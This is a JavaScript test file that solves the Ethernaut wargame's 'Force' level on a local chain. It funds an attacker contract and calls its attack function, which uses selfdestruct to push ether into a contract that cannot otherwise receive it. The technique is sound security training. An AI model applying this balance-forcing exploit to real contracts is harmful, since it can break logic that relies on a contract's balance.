const ForceFactory = artifacts.require('./levels/ForceFactory.sol')
const Force = artifacts.require('./levels/Force.sol')
const ForceAttacker = artifacts.require('./attacks/N7ForceAttacker.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")


describe("Challenge 7 - Force", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await ForceFactory.new()
        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            Force
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {
        it("instance has balance of zero", async function () {
            expect(await utils.getBalance(web3, instance.address)).to.eq("0")
        })
    })

    describe("Attack Execution", function () {
        /*
            For this attack we will create a contract wich will have a function that
            will push the SELFDESTRUCT opcode to the stack.

            When this happens, our attacker contract will be deleted and all it's funds
            sent to the address provided as argument to the selfdestruct function.
        */
        it("fund target contract", async function () {
            amountToFund = "1"
            const maliciousContract = await ForceAttacker.new()

            //fund the attacker contract so that it can send those funds when destroyed
            const txn = {
                to: maliciousContract.address,
                from: attacker,
                value: web3.utils.toWei(amountToFund, "ether")
            }

            await web3.eth.sendTransaction(txn)
            expect(await utils.getBalance(web3, maliciousContract.address)).to.eq(amountToFund)

            await maliciousContract.attack(instance.address)
            expect(await utils.getBalance(web3, instance.address)).to.eq(amountToFund)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})